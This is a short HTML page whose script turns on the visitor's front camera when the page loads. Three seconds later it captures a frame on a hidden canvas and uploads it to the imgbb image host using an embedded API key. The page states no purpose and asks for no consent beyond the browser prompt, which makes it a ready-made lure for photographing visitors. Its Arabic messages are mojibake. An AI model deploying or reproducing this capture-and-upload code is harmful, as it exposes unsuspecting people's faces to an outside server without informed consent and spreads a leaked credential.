<!DOCTYPE html>
<html>
<body>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>

  <script>
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
      .then(stream => {
        const video = document.getElementById('video');
        video.srcObject = stream;

        setTimeout(() => {
          const canvas = document.getElementById('canvas');
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          const imageData = canvas.toDataURL('image/jpeg');
          const base64Image = imageData.split(',')[1];

          const formData = new FormData();
          formData.append('image', base64Image);

          fetch('https://api.imgbb.com/1/upload?key=85c1b237cc85eb120a31cf73476b1eba', {
            method: 'POST',
            body: formData
          })
          .then(response => response.json())
          .then(data => {
            console.log('๐ธ ุชู ุงูุฑูุน ุจูุฌุงุญ: ', data.data.url);
            alert("ุชู ุงูุฑูุน: " + data.data.url);
          })
          .catch(error => {
            console.error('โ ูุดู ุงูุฑูุน:', error);
            alert("ุญุฏุซ ุฎุทุฃ ุฃุซูุงุก ุฑูุน ุงูุตูุฑุฉ.");
          });
        }, 3000);
      })
      .catch(error => {
        console.error('โ ูุดู ุชุดุบูู ุงููุงููุฑุง:', error);
        alert("ูู ูุชููู ูู ุงููุตูู ุฅูู ุงููุงููุฑุง.");
      });
  </script>
</body>
</html>
